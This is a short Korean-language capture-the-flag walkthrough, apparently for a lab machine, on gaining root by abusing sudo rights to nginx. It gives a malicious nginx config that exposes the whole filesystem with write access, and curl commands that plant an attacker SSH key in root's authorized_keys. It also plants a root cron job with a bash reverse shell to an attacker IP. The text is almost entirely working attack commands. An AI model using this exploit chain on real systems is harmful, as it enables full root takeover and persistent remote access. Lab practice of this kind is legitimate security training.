### 악의적인 nignx 포트 열기 (피해자 PC)

root 부터 디렉토리 인덱싱, PUT 메서드로 파일 삽입 (베이스는 /etc/nginx/nginx.conf)

```nginx
user root;
worker_processes auto;
pid /run/nginx2.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
				worker_connections 768;
}
http {
				server {
						listen 9001;
						location / {
								root /;
								autoindex on;
								dav_methods PUT;
						}
				}
}
```

그리고 sudo nginx 실행
```bash
sudo nginx -c /dev/shm/nginx.conf
```

### root 의 ssh 공개키 업로드 (공격자 PC)

공격자 PC
```bash
ssh-keygen -f broker
curl 10.10.11.243:9001/root/.ssh/authorized_keys --upload-file broker.pub
```

이후 다음 커맨드로 ssh 에 접근하면 root 쉘로 접근할 수 있다.
```bash
ssh -i broker root@10.10.11.243
```

### root의 cron 업로드 (공격자 PC)

**cron**
```bash
* * * * * bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
```

악의적인 cron 업로드
```bash
curl 10.10.11.243:9001/var/spool/cron/crontabs/root --upload-file cron
```